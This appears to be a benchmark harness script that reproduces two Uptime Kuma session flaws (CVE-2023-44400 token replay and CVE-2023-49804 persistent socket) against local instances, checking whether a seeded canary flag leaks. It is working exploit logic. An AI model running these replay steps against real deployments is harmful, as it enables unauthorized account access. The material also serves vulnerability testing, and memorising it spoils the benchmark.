#!/usr/bin/env python3
"""Drive the REAL Uptime Kuma socket.io API (official louislam/uptime-kuma image).

No Uptime Kuma JWT/session helpers are copied here. The live Node process is the SUT.

Usage:
  python3 seed_exec.py --bootstrap [version]     # setup wizard + private flag monitor
  python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import json
import os
import sys
import time

import socketio

ACK_TIMEOUT = 15
CONNECT_TIMEOUT = 20
PW2 = "Rot8Pass456"
PW1 = "NewPass123"
PW0 = "OldPass123"
ADMIN = "admin"
KNOWN_PW = (PW0, PW1, PW2)
BASE = {
    "v0": "http://127.0.0.1:40740",
    "v1": "http://127.0.0.1:40741",
    "v2": "http://127.0.0.1:40742",
}


def _probe_flag() -> str:
    return (
        os.environ.get("PCB_X")
        or os.environ.get("RUN_FLAG")
        or os.environ.get("PCB_FLAG")
        or "PCBFLAG_UNSET"
    )


def _seed_flag() -> str:
    # Real canary written at start/bootstrap. Wrong/stale verify must not re-seed.
    return (
        os.environ.get("RUN_FLAG_REF")
        or os.environ.get("PCB_FLAG")
        or os.environ.get("RUN_FLAG")
        or _probe_flag()
    )


def _base_url(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    return BASE[version]


def _connect(base):
    c = socketio.Client(reconnection=False, request_timeout=CONNECT_TIMEOUT)
    state = {"monitorList": None, "disconnected": False}

    @c.on("monitorList")
    def _ml(data):
        state["monitorList"] = data

    @c.on("disconnect")
    def _dc(*_a):
        state["disconnected"] = True

    c.connect(base, transports=["websocket"], wait_timeout=CONNECT_TIMEOUT)
    return c, state


def _call(c, event, *args):
    try:
        if len(args) == 0:
            return c.call(event, timeout=ACK_TIMEOUT)
        if len(args) == 1:
            return c.call(event, args[0], timeout=ACK_TIMEOUT)
        return c.call(event, tuple(args), timeout=ACK_TIMEOUT)
    except Exception as e:
        return {"__error": str(e)}


def _disconnect(c):
    try:
        c.disconnect()
    except Exception:
        pass


def _monitor(flag):
    return {
        "type": "http",
        "name": flag,
        "description": flag,
        "url": "https://example.com",
        "interval": 60,
        "retryInterval": 60,
        "resendInterval": 0,
        "maxretries": 0,
        "active": False,
        "upsideDown": False,
        "maxredirects": 10,
        "accepted_statuscodes": ["200-299"],
        "notificationIDList": {},
        "method": "GET",
        "ignoreTls": False,
        "expiryNotification": False,
        "kafkaProducerBrokers": [],
        "kafkaProducerSaslOptions": {},
    }


def _flag_in(state, flag):
    ml = state.get("monitorList")
    return bool(ml) and (flag in json.dumps(ml, default=str))


def _current_password(base):
    for pw in KNOWN_PW:
        c, _ = _connect(base)
        r = _call(c, "login", {"username": ADMIN, "password": pw, "token": ""})
        _disconnect(c)
        if isinstance(r, dict) and r.get("ok"):
            return pw
    return None


def _other_pw(cur):
    for p in (PW1, PW2, PW0):
        if p != cur:
            return p
    return PW2


def bootstrap(version="v0"):
    """Idempotent: wait for socket.io, complete setup wizard, seed private flag monitor."""
    base = _base_url(version)
    flag = _seed_flag()
    last_err = None
    for _ in range(90):
        c = None
        try:
            c, state = _connect(base)
            need = _call(c, "needSetup")
            if need is None or (isinstance(need, dict) and need.get("__error")):
                raise RuntimeError(f"needSetup={need!r}")
            if need is True:
                _call(c, "setup", ADMIN, PW0)
            pw = PW0
            login = _call(c, "login", {"username": ADMIN, "password": pw, "token": ""})
            if not (isinstance(login, dict) and login.get("ok")):
                _disconnect(c)
                found = _current_password(base)
                if not found:
                    raise RuntimeError(f"login failed: {login}")
                c, state = _connect(base)
                login = _call(c, "login", {"username": ADMIN, "password": found, "token": ""})
                if not (isinstance(login, dict) and login.get("ok")):
                    raise RuntimeError(f"login failed after discover: {login}")
            state["monitorList"] = None
            _call(c, "getMonitorList")
            time.sleep(0.5)
            if _flag_in(state, flag):
                _disconnect(c)
                print(json.dumps({"ok": True, "bootstrap": "already_seeded", "version": version}))
                return 0
            add = _call(c, "add", _monitor(flag))
            time.sleep(0.4)
            state["monitorList"] = None
            _call(c, "getMonitorList")
            time.sleep(0.5)
            ok_add = isinstance(add, dict) and add.get("ok")
            if ok_add or _flag_in(state, flag):
                _disconnect(c)
                print(json.dumps({"ok": True, "bootstrap": "seeded", "add": add, "version": version}))
                return 0
            last_err = f"add={add!r} flag_in={_flag_in(state, flag)}"
            _disconnect(c)
        except Exception as e:
            last_err = str(e)
            if c is not None:
                _disconnect(c)
        time.sleep(2)
    print(json.dumps({"ok": False, "error": f"bootstrap failed: {last_err}"}), file=sys.stderr)
    return 1


def _seed_leg(base, cur_pw, flag):
    new_pw = _other_pw(cur_pw)
    a, _ = _connect(base)
    la = _call(a, "login", {"username": ADMIN, "password": cur_pw, "token": ""})
    token = la.get("token") if isinstance(la, dict) else None
    _disconnect(a)

    b, _ = _connect(base)
    _call(b, "login", {"username": ADMIN, "password": cur_pw, "token": ""})
    cp = _call(b, "changePassword", {"currentPassword": cur_pw, "newPassword": new_pw})
    _disconnect(b)
    if not (isinstance(cp, dict) and cp.get("ok")):
        new_pw = cur_pw

    c, state = _connect(base)
    tok = _call(c, "loginByToken", token)
    body, flag_ret = "loginByToken rejected (token invalid due to password change)", False
    if isinstance(tok, dict) and tok.get("ok"):
        state["monitorList"] = None
        _call(c, "getMonitorList")
        time.sleep(0.6)
        if _flag_in(state, flag):
            body, flag_ret = f"SECRET={flag}", True
        else:
            body = "loginByToken ok but probe flag not in monitorList"
    _disconnect(c)
    return {
        "leg": "seed",
        "probe": "cve-2023-44400-new-conn-old-token-replay",
        "token_captured": bool(token),
        "loginByToken_ok": bool(isinstance(tok, dict) and tok.get("ok")),
        "changePassword_ok": bool(isinstance(cp, dict) and cp.get("ok")),
        "flag_retrieved": flag_ret,
        "body": body,
        "new_pw": new_pw,
    }


def _residual_leg(base, cur_pw, flag):
    new_pw = _other_pw(cur_pw)
    d, dstate = _connect(base)
    ld = _call(d, "login", {"username": ADMIN, "password": cur_pw, "token": ""})
    if not (isinstance(ld, dict) and ld.get("ok")):
        _disconnect(d)
        return {
            "leg": "residual",
            "error": f"D login failed: {ld}",
            "flag_retrieved": False,
            "body": "precondition failed",
        }
    time.sleep(0.3)

    e, _ = _connect(base)
    _call(e, "login", {"username": ADMIN, "password": cur_pw, "token": ""})
    cp = _call(e, "changePassword", {"currentPassword": cur_pw, "newPassword": new_pw})
    _disconnect(e)

    time.sleep(1.2)
    still = bool(d.connected) and not dstate["disconnected"]

    body, flag_ret = "live socket torn down after password change (disconnectAllSocketClients)", False
    if still:
        dstate["monitorList"] = None
        _call(d, "getMonitorList")
        time.sleep(0.6)
        if _flag_in(dstate, flag):
            body, flag_ret = f"SECRET={flag}", True
        else:
            body = "socket alive but no monitorList returned"
    _disconnect(d)
    return {
        "leg": "residual",
        "probe": "cve-2023-49804-pre-change-persistent-socket",
        "d_still_connected": still,
        "changePassword_ok": bool(isinstance(cp, dict) and cp.get("ok")),
        "flag_retrieved": flag_ret and still,
        "body": body,
    }


def run_probe(candidate, *, version="v1"):
    cand = candidate if isinstance(candidate, dict) else {}
    mode = cand.get("mode", "seed")
    flag = _probe_flag()
    try:
        base = _base_url(version)
        cur = _current_password(base)
        if not cur:
            return {
                "version": version,
                "mode": mode,
                "error": "bootstrap: no working admin password",
                "body": "precondition failed",
            }
        if mode == "seed":
            out = _seed_leg(base, cur, flag)
        else:
            out = _residual_leg(base, cur, flag)
    except Exception as e:
        return {"version": version, "mode": mode, "error": f"scenario failed: {e}"}
    out["version"] = version
    out["mode"] = mode
    out["probe_id"] = cand.get("probe_id")
    return out


if __name__ == "__main__":
    if len(sys.argv) >= 2 and sys.argv[1] == "--bootstrap":
        ver = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("VERSION", "v0")
        raise SystemExit(bootstrap(ver))
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
